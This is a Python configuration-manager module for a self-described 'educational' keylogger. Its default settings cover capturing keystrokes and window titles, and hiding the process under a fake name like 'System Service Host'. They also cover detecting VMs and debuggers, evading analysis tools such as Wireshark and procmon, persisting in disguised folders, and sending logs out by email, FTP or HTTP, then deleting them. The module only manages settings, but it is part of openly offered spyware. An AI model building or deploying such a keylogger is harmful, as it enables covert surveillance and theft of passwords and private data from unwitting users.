#!/usr/bin/env python3
"""
Configuration Manager for Educational Keylogger

This module handles configuration loading, validation, and management
for the keylogger system.
"""

import os
import json
import time
import threading
from datetime import datetime
from pathlib import Path
import platform


class ConfigManager:
    def __init__(self, config_file="config.json"):
        self.config_file = config_file
        self.config = {}
        self.config_lock = threading.Lock()
        self.last_modified = 0
        self.auto_reload = True
        
        # Load initial configuration
        self.load_config()
        
        # Start auto-reload thread if enabled
        if self.auto_reload:
            self.start_auto_reload()
    
    def get_default_config(self):
        """Get default configuration template"""
        return {
            "general": {
                "debug_mode": False,
                "log_level": "INFO",
                "process_name": "System Configuration Manager"
            },
            "keylogger": {
                "enabled": True,
                "buffer_size": 100,
                "flush_interval_minutes": 5,
                "log_special_keys": True,
                "log_timestamps": True,
                "capture_window_titles": True,
                "capture_application_names": True
            },
            "encryption": {
                "enabled": True,
                "algorithm": "Fernet",
                "password": "change_this_password_for_security",
                "key_file": ".encryption.key",
                "compress_logs": True
            },
            "stealth": {
                "hide_console": True,
                "process_name_obfuscation": True,
                "fake_process_name": "System Service Host",
                "create_decoy_files": True,
                "vm_detection": True,
                "anti_debug": True,
                "self_destruct_on_analysis": False
            },
            "persistence": {
                "startup_enabled": False,
                "auto_restart": True,
                "restart_delay_seconds": 30,
                "max_restart_attempts": 5,
                "install_location": self.get_default_install_location(),
                "service_enabled": False,
                "watchdog_enabled": True
            },
            "storage": {
                "log_file": "keylog.txt",
                "encrypted_log_file": "keylog.enc",
                "database_file": ".keylog.db",
                "max_log_size_mb": 10,
                "auto_cleanup_days": 30,
                "backup_enabled": True,
                "backup_interval_days": 7
            },
            "transmission": {
                "enabled": False,
                "method": "email",
                "interval_hours": 24,
                "delete_after_send": True,
                "retry_attempts": 3,
                "compress_before_send": True
            },
            "email": {
                "enabled": False,
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "use_tls": True,
                "sender_email": "",
                "sender_password": "",
                "recipient_email": "",
                "subject_prefix": "Keylogger Report"
            },
            "ftp": {
                "enabled": False,
                "server": "",
                "port": 21,
                "username": "",
                "password": "",
                "remote_directory": "/uploads",
                "use_passive": True
            },
            "http": {
                "enabled": False,
                "url": "",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": "System Service"
                },
                "timeout_seconds": 30,
                "verify_ssl": True
            },
            "security": {
                "whitelist_processes": [],
                "blacklist_processes": ["ida", "ollydbg", "wireshark", "procmon"],
                "allowed_users": [],
                "restricted_paths": [],
                "max_daily_logs": 10000,
                "emergency_stop_file": ".stop_keylogger"
            },
            "monitoring": {
                "system_activity": True,
                "network_monitoring": False,
                "process_monitoring": True,
                "file_monitoring": False,
                "check_interval_seconds": 60
            },
            "advanced": {
                "multi_threading": True,
                "memory_optimization": True,
                "cpu_throttling": False,
                "steganography": False,
                "polymorphic_code": False,
                "rootkit_mode": False
            }
        }
    
    def get_default_install_location(self):
        """Get default installation location based on OS"""
        system = platform.system()
        if system == "Windows":
            return os.path.join(os.environ.get('APPDATA', ''), 'SystemConfiguration')
        elif system == "Linux":
            return os.path.expanduser('~/.config/system-configuration')
        elif system == "Darwin":  # macOS
            return os.path.expanduser('~/Library/Application Support/SystemConfiguration')
        else:
            return os.path.expanduser('~/.system-configuration')
    
    def load_config(self):
        """Load configuration from file"""
        try:
            with self.config_lock:
                if os.path.exists(self.config_file):
                    with open(self.config_file, 'r') as f:
                        loaded_config = json.load(f)
                    
                    # Merge with defaults (add missing keys)
                    default_config = self.get_default_config()
                    self.config = self.merge_configs(default_config, loaded_config)
                    
                    # Update last modified time
                    self.last_modified = os.path.getmtime(self.config_file)
                    
                    print(f"✅ Configuration loaded from {self.config_file}")
                else:
                    # Use default configuration
                    self.config = self.get_default_config()
                    self.save_config()
                    print(f"📄 Created default configuration: {self.config_file}")
                
                # Validate configuration (simplified)
                try:
                    self.validate_config()
                except Exception as e:
                    print(f"⚠️  Configuration validation warning: {e}")
                    # Continue anyway with loaded config
                
        except Exception as e:
            print(f"❌ Error loading configuration: {e}")
            print("🔧 Using default configuration")
            self.config = self.get_default_config()
    
    def merge_configs(self, default, loaded):
        """Recursively merge configurations, preferring loaded values"""
        merged = default.copy()
        
        for key, value in loaded.items():
            if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
                merged[key] = self.merge_configs(merged[key], value)
            else:
                merged[key] = value
        
        return merged
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with self.config_lock:
                # Create backup of existing config
                if os.path.exists(self.config_file):
                    backup_file = f"{self.config_file}.backup.{int(time.time())}"
                    os.rename(self.config_file, backup_file)
                
                # Save new configuration
                with open(self.config_file, 'w') as f:
                    json.dump(self.config, f, indent=4, default=str)
                
                # Update last modified time
                self.last_modified = os.path.getmtime(self.config_file)
                
                print(f"💾 Configuration saved to {self.config_file}")
                return True
                
        except Exception as e:
            print(f"❌ Error saving configuration: {e}")
            return False
    
    def validate_config(self):
        """Validate configuration values"""
        errors = []
        
        try:
            # Quick validation - just check if basic structure exists
            if not isinstance(self.config, dict):
                errors.append("Configuration is not a valid dictionary")
                return False
            
            # Validate required sections exist
            required_sections = ['general', 'keylogger', 'encryption', 'stealth', 'storage']
            for section in required_sections:
                if section not in self.config:
                    # Create missing sections with defaults
                    self.config[section] = {}
                    print(f"⚠️  Created missing section: {section}")
            
            # Basic encryption check (non-blocking)
            encryption_config = self.config.get('encryption', {})
            if encryption_config.get('enabled') and encryption_config.get('password') == 'change_this_password_for_security':
                errors.append("⚠️  WARNING: Using default encryption password! Please change it.")
            
            # Report validation results
            if errors:
                print("⚠️  Configuration validation warnings:")
                for error in errors:
                    print(f"   - {error}")
            else:
                print("✅ Configuration validation passed")
            
            return True  # Always return True to continue
            
        except Exception as e:
            print(f"❌ Error validating configuration: {e}")
            return True  # Continue anyway
    
    def get(self, key_path, default=None):
        """Get configuration value using dot notation (e.g., 'email.smtp_server')"""
        try:
            # Simple version without locking to avoid deadlock during initialization
            keys = key_path.split('.')
            value = self.config
            
            for key in keys:
                if isinstance(value, dict) and key in value:
                    value = value[key]
                else:
                    return default
            
            return value
            
        except Exception:
            return default
    
    def set(self, key_path, value):
        """Set configuration value using dot notation"""
        try:
            with self.config_lock:
                keys = key_path.split('.')
                config_ref = self.config
                
                # Navigate to the parent of the target key
                for key in keys[:-1]:
                    if key not in config_ref:
                        config_ref[key] = {}
                    config_ref = config_ref[key]
                
                # Set the final value
                config_ref[keys[-1]] = value
                
                print(f"🔧 Configuration updated: {key_path} = {value}")
                return True
                
        except Exception as e:
            print(f"❌ Error setting configuration: {e}")
            return False
    
    def get_section(self, section_name):
        """Get entire configuration section"""
        return self.get(section_name, {})
    
    def update_section(self, section_name, section_data):
        """Update entire configuration section"""
        try:
            with self.config_lock:
                if section_name in self.config:
                    self.config[section_name].update(section_data)
                else:
                    self.config[section_name] = section_data
                
                print(f"🔧 Configuration section updated: {section_name}")
                return True
                
        except Exception as e:
            print(f"❌ Error updating section: {e}")
            return False
    
    def check_for_updates(self):
        """Check if configuration file has been modified externally"""
        try:
            if os.path.exists(self.config_file):
                current_modified = os.path.getmtime(self.config_file)
                if current_modified != self.last_modified:
                    print("🔄 Configuration file changed, reloading...")
                    self.load_config()
                    return True
            return False
            
        except Exception as e:
            print(f"❌ Error checking for config updates: {e}")
            return False
    
    def start_auto_reload(self):
        """Start automatic configuration reloading"""
        def reload_monitor():
            while self.auto_reload:
                try:
                    self.check_for_updates()
                    time.sleep(5)  # Check every 5 seconds
                except Exception as e:
                    print(f"❌ Error in config reload monitor: {e}")
                    time.sleep(10)
        
        reload_thread = threading.Thread(target=reload_monitor, daemon=True)
        reload_thread.start()
        print("🔄 Auto-reload monitoring started")
    
    def stop_auto_reload(self):
        """Stop automatic configuration reloading"""
        self.auto_reload = False
        print("⏹️  Auto-reload monitoring stopped")
    
    def export_config(self, output_file=None):
        """Export current configuration to file"""
        if not output_file:
            output_file = f"config_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.config, f, indent=4, default=str)
            
            print(f"📤 Configuration exported to: {output_file}")
            return output_file
            
        except Exception as e:
            print(f"❌ Error exporting configuration: {e}")
            return None
    
    def import_config(self, input_file):
        """Import configuration from file"""
        try:
            with open(input_file, 'r') as f:
                imported_config = json.load(f)
            
            # Validate imported configuration
            old_config = self.config.copy()
            self.config = self.merge_configs(self.get_default_config(), imported_config)
            
            if self.validate_config():
                self.save_config()
                print(f"📥 Configuration imported from: {input_file}")
                return True
            else:
                # Restore old configuration if validation fails
                self.config = old_config
                print(f"❌ Invalid configuration in {input_file}, import cancelled")
                return False
                
        except Exception as e:
            print(f"❌ Error importing configuration: {e}")
            return False
    
    def reset_to_defaults(self):
        """Reset configuration to default values"""
        try:
            self.config = self.get_default_config()
            self.save_config()
            print("🔄 Configuration reset to defaults")
            return True
            
        except Exception as e:
            print(f"❌ Error resetting configuration: {e}")
            return False
    
    def get_config_summary(self):
        """Get a summary of current configuration"""
        try:
            summary = {
                "keylogger_enabled": self.get('keylogger.enabled'),
                "encryption_enabled": self.get('encryption.enabled'),
                "stealth_mode": self.get('stealth.hide_console'),
                "persistence_enabled": self.get('persistence.startup_enabled'),
                "transmission_enabled": self.get('transmission.enabled'),
                "transmission_method": self.get('transmission.method'),
                "log_file": self.get('storage.log_file'),
                "process_name": self.get('general.process_name'),
                "debug_mode": self.get('general.debug_mode')
            }
            
            return summary
            
        except Exception as e:
            print(f"❌ Error generating config summary: {e}")
            return {}
    
    def print_config_summary(self):
        """Print a formatted configuration summary"""
        summary = self.get_config_summary()
        
        print("\n📋 Configuration Summary")
        print("=" * 40)
        
        for key, value in summary.items():
            status = "✅" if value else "❌"
            if isinstance(value, str):
                status = "📝"
            print(f"   {status} {key.replace('_', ' ').title()}: {value}")
        
        print("=" * 40)
    
    def check_emergency_stop(self):
        """Check for emergency stop file"""
        stop_file = self.get('security.emergency_stop_file', '.stop_keylogger')
        
        if os.path.exists(stop_file):
            print(f"🚨 Emergency stop file detected: {stop_file}")
            try:
                os.remove(stop_file)
                print("🗑️  Emergency stop file removed")
            except:
                pass
            return True
        
        return False
    
    def create_emergency_stop(self):
        """Create emergency stop file"""
        try:
            stop_file = self.get('security.emergency_stop_file', '.stop_keylogger')
            
            with open(stop_file, 'w') as f:
                f.write(f"Emergency stop created: {datetime.now()}\n")
                f.write("This file will cause the keylogger to stop.\n")
            
            print(f"🚨 Emergency stop file created: {stop_file}")
            return True
            
        except Exception as e:
            print(f"❌ Error creating emergency stop file: {e}")
            return False


# Configuration validation functions
def validate_email_config(email_config):
    """Validate email configuration"""
    if not email_config.get('enabled'):
        return True
    
    required_fields = ['smtp_server', 'smtp_port', 'sender_email', 'recipient_email']
    for field in required_fields:
        if not email_config.get(field):
            return False, f"Missing required email field: {field}"
    
    # Validate email format (basic)
    import re
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if not re.match(email_pattern, email_config['sender_email']):
        return False, "Invalid sender email format"
    
    if not re.match(email_pattern, email_config['recipient_email']):
        return False, "Invalid recipient email format"
    
    return True, ""


def validate_ftp_config(ftp_config):
    """Validate FTP configuration"""
    if not ftp_config.get('enabled'):
        return True
    
    required_fields = ['server', 'username', 'password']
    for field in required_fields:
        if not ftp_config.get(field):
            return False, f"Missing required FTP field: {field}"
    
    port = ftp_config.get('port', 21)
    if not isinstance(port, int) or port < 1 or port > 65535:
        return False, "Invalid FTP port"
    
    return True, ""


# Example usage and testing
if __name__ == "__main__":
    print("🔧 Configuration Manager - Educational Testing")
    print("=" * 50)
    
    # Initialize configuration manager
    config_manager = ConfigManager()
    
    # Print configuration summary
    config_manager.print_config_summary()
    
    # Test configuration operations
    print(f"\n🧪 Testing Configuration Operations...")
    
    # Test getting values
    print(f"📖 Keylogger enabled: {config_manager.get('keylogger.enabled')}")
    print(f"📖 Process name: {config_manager.get('general.process_name')}")
    
    # Test setting values
    config_manager.set('general.debug_mode', True)
    print(f"📝 Debug mode set to: {config_manager.get('general.debug_mode')}")
    
    # Test section operations
    stealth_config = config_manager.get_section('stealth')
    print(f"📋 Stealth configuration: {len(stealth_config)} options")
    
    print(f"\n✅ Configuration testing completed")